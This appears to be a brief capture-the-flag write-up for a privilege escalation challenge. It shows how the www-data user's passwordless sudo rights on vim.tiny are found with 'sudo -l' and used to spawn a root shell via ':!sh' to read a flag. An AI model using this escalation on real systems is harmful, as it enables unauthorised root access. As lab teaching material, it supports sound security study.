# Challenge (Privilege Escalation)
> This is assuming that you have already gotten interactive shell.

This challenge is created to give attacker and easy way to obtain shell. Because the user `www-data` is given some `sudo` permissions.

You can run below to see what `sudo` permissions your user has.
```sh
$ sudo -l
...
(ALL) NOPASSWD: /usr/bin/vim.tiny
...
```

This means that your user does not need password to run `/usr/bin/vim.tiny` which is `vi`.

So you can run it like this.
```sh
$ sudo /usr/bin/vim.tiny
```

And you will get `vi` which you can run shell from.
```
: !sh
```

And boom! You got root! And you can read the flag at `/root/flag`.